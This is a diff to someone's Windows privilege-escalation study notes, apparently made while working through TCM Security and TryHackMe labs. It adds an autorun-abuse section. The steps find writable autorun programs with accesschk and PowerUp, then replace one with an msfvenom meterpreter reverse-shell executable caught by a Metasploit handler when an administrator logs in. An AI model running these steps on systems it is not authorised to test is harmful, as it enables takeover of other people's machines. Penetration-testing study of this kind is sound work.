@@ -80,13 +80,49 @@ Abuse of the research methodology of executable of windows. We will try to place
 
 - `cmdkey /list`
 
-### How to
+### How to exploit
 
 - Check the writeup for Access on HTB [here](../writeups/HTB-access.md) to have an example of privesc using runas
+
+## Autorun
+
+### What is it
+
+- It is when you abuse the fact that a program runs automatically
+
+### Enumerate
+
+- Check what programs have autorun using [Windows internals - autorun](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) see example below  
+![image](https://user-images.githubusercontent.com/96747355/162574595-2e7704db-5be0-411c-98f0-1b075628ec92.png)  
+
+- Check that the program you found that allows FILE_ALL_ACCESS to Everyone using [Windows internals - accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in our example we would type this in the cmd `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
+![image](https://user-images.githubusercontent.com/96747355/162574634-d6459714-366e-4afa-9735-d469eb8e3ab9.png)  
+**OR**  
+- With [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
+  - In a win cmd type `powershell -ep bypass`
+  - Then `. .\PowerUp.ps1` to load powerUp
+  - `Invoke-AllChecks`
+![image](https://user-images.githubusercontent.com/96747355/162574989-40f208c1-12ac-47d6-99b7-3035cf9b4297.png)  
+
+### How to exploit
+
+- In kali
+  - `msfconsole`
+  - `use multi/handler`
+  - `set payload windows/meterpreter/reverse_tcp`
+  - `set lhost Your-Kali-IP-Address`
+  - `run`
+  - In another cmd tab `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe` (give it the same name as the program that has autorun)
+- Take the program you created with msfvenom in your target (python HTTP server and then the browser in your target)
+- In your target
+  - Place the program in the directory where the autorun program is
+  - Wait for the administrator to log in
+- You should have a shell in your kali in Metasploit
 
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
+{% embed url="https://tryhackme.com/room/windowsprivescarena" %} Windows privesc arena by TCM on TryHackMe {% endembed %}
 {% embed url="https://www.fuzzysecurity.com/tutorials/16.html" %} Windows privesc on Fuzzy Security{% endembed %}  
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %} Windows privesc on PayloadsAllTheThings{% endembed %}  
 {% embed url="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" %} Windows privesc on Absolomb{% endembed %}  
